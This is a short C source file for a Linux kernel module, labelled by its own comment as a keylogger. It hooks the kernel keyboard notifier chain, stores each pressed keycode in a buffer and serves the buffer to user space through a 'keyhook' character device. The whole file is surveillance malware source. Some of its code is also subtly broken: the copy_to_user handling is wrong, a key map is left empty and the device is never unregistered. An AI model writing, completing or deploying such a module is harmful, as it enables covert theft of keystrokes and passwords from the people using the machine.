// dumb keylog using notification chain api
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/input.h>
#include <linux/mutex.h>
#include <linux/fs.h>

#define BUFFER_LIMIT 0x200

MODULE_LICENSE("GPL");
static int __init keyhook_init(void);
static void __exit keyhook_exit(void);
module_init(keyhook_init);
module_exit(keyhook_exit);

DEFINE_MUTEX(g_lock);
static unsigned char g_buffer[BUFFER_LIMIT+1];
static int g_delta = 0;

static ssize_t keyhook_read(
    struct file* filp,
    char __user* buf,
    size_t len,
    loff_t* offset
  ) {
    int n;
    mutex_lock(&g_lock);
    if ((n = copy_to_user(buf, g_buffer, g_delta)) > 0) {
      memset(g_buffer, 0, BUFFER_LIMIT);
      g_delta = 0;
    } 
    mutex_unlock(&g_lock);
    return n;
  }

static int keyhook_cb(struct notifier_block* nb, size_t action, void* _param) {
  static unsigned char* us_map[] = {
  };
  struct keyboard_notifier_param* kbp =
    (struct keyboard_notifier_param *)_param;

  if (kbp->down && action == KBD_KEYCODE) {
    mutex_lock(&g_lock);
    if (g_delta < BUFFER_LIMIT)
      g_buffer[g_delta++] = kbp->value;
    mutex_unlock(&g_lock);
  }
  return NOTIFY_OK;
}



static struct notifier_block keyhook_nb = {
  .priority = 0,
  .notifier_call=keyhook_cb
};
static int __init keyhook_init(void) {
  static struct file_operations fops = {
    .read = keyhook_read
  };
  mutex_init(&g_lock);
  int major = register_chrdev(0, "keyhook", &fops);
  if (major < 0) {
    printk(KERN_ALERT "Could not allocate character device region!\n");
    return major;
  }
  register_keyboard_notifier(&keyhook_nb);
  
  return 0;
}
static void __exit keyhook_exit(void) {
  unregister_keyboard_notifier(&keyhook_nb);
}
